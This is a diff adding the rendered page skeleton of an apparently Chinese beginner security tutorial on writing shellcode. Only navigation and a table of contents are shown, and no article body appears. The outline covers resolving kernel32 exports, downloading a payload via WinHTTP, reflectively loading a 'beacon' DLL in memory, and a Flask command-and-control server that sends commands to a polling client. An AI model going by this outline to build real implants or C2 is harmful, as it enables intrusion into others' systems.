@@ -1,0 +1,4107 @@
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+        <link rel="canonical" href="https://huoji120.github.io/shellcode/shellcode/">
+      
+      
+        <link rel="prev" href="../../malware_analyze/slievr_fox_analyze_1/">
+      
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+    
+    
+      
+        <title>0基础编写shellcode - 二进制新手入门</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#shellcode" class="md-skip">
+          跳转至
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="页眉">
+    <a href="../.." title="二进制新手入门" class="md-header__button md-logo" aria-label="二进制新手入门" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            二进制新手入门
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              0基础编写shellcode
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+    
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="查找">
+        
+        <button type="reset" class="md-search__icon md-icon" title="清空当前内容" aria-label="清空当前内容" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            正在初始化搜索引擎
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/huoji120/huoji120.github.io" title="前往仓库" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
+  </div>
+  <div class="md-source__repository">
+    huoji120/huoji120.github.io
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="导航栏" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="二进制新手入门" class="md-nav__button md-logo" aria-label="二进制新手入门" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    二进制新手入门
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/huoji120/huoji120.github.io" title="前往仓库" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
+  </div>
+  <div class="md-source__repository">
+    huoji120/huoji120.github.io
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_1" id="__nav_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CrackMe
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_1">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    CrackMe
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../crackme/cpp-no-pack-keygenme-crackme/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    C++无壳 新手第一個 KeyGenMe/Crackme
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    恶意软件分析
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    恶意软件分析
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../malware_analyze/slievr_fox_analyze_1/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    0基础分析阶段执行银狐木马(带混淆)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    shellcode
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    shellcode
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    0基础编写shellcode
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    0基础编写shellcode
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#shellcode_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        一、编写shellcode
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="一、编写shellcode">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#kernel32" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        解决重定向第一步: 获取kernel32的地址
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="解决重定向第一步: 获取kernel32的地址">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        逐句分析环节
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        解决重定向第二步: 解析导出表
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="解决重定向第二步: 解析导出表">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        逐句分析环节
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        解决重定向第三步:进一步升级，动态解析+可复用
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="解决重定向第三步:进一步升级，动态解析+可复用">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        逐句分析环节
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#shellcode_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        现在实现shellcode吧！
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="现在实现shellcode吧！">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        逐句分析环节
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        逐句分析
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#payload" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        二、payload下载
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="二、payload下载">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#url" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        准备结构体（初始化），进行URL解析
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="准备结构体（初始化），进行URL解析">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        逐句分析环节
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#winhttp" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        加载 WinHTTP
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="加载 WinHTTP">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        逐句分析环节
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#api" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        准备 API
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="准备 API">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_10" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        分析
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_11" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        创建会话
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#head" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        第一次请求（HEAD）,获取下载大小
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_12" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        获取数据
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#beacon-dll" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        三、beacon编写，手动把 DLL 加载到内存并执行
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="三、beacon编写，手动把 DLL 加载到内存并执行">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#beacon" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        加载beacon
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="加载beacon">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#raw" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        申请一块raw内存
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pe" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        解析PE头
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pe_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        解析到PE头后,拿到真实大小
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#peraw" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        展开PE,拷贝raw内存的数据到更大的内存里面
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_13" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        重定位
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_14" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        修复导入表
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_15" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        运行
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_16" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        四、服务器编写
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="四、服务器编写">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#flaskhello-world" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        flask的第一个hello world
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="flask的第一个hello world">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_17" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        逐行解释分析
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#-" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        客户端 -&gt; 服务端接口
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#-_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        客户端执行结果 -&gt; 服务端
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_18" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        服务端输入命令&amp;服务端获取回显
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_19" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        测试
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_20" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        五、客户端的第一个指令
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="五、客户端的第一个指令">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_21" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        循环链接服务端
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="循环链接服务端">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_22" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        分析
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#shellcode_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        一、编写shellcode
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="一、编写shellcode">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#kernel32" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        解决重定向第一步: 获取kernel32的地址
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="解决重定向第一步: 获取kernel32的地址">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        逐句分析环节
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        解决重定向第二步: 解析导出表
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="解决重定向第二步: 解析导出表">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        逐句分析环节
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        解决重定向第三步:进一步升级，动态解析+可复用
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="解决重定向第三步:进一步升级，动态解析+可复用">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        逐句分析环节
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#shellcode_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        现在实现shellcode吧！
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="现在实现shellcode吧！">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        逐句分析环节
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        逐句分析
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#payload" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        二、payload下载
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="二、payload下载">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#url" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        准备结构体（初始化），进行URL解析
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="准备结构体（初始化），进行URL解析">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        逐句分析环节
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#winhttp" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        加载 WinHTTP
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="加载 WinHTTP">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        逐句分析环节
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#api" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        准备 API
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="准备 API">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_10" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        分析
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_11" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        创建会话
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#head" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        第一次请求（HEAD）,获取下载大小
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_12" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        获取数据
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#beacon-dll" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        三、beacon编写，手动把 DLL 加载到内存并执行
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="三、beacon编写，手动把 DLL 加载到内存并执行">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#beacon" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        加载beacon
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="加载beacon">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#raw" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        申请一块raw内存
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pe" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        解析PE头
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pe_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        解析到PE头后,拿到真实大小
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#peraw" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        展开PE,拷贝raw内存的数据到更大的内存里面
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_13" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        重定位
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_14" class="md-nav__link">
+    <span class="md-ellipsis">
+      
